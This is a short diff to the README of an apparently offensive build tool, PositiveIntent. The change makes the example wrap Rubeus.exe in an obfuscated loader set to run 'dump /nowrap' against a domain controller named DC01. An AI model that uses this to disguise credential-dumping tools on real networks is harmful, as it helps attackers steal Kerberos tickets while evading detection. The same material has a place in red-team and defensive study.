@@ -14,7 +14,7 @@ pipx install git+https://github.com/Mister-Joe/PositiveIntent.git
 ### Building
 
 ```
-pi_build --file .\log.txt --hostname DC01 --args 'dump /nowrap' --writetofile
+pi_build --file .\Rubeus.exe --hostname DC01 --args 'dump /nowrap' --writetofile
 
 [+] Updated loader source files
 [+] Obfuscated Rubeus.exe
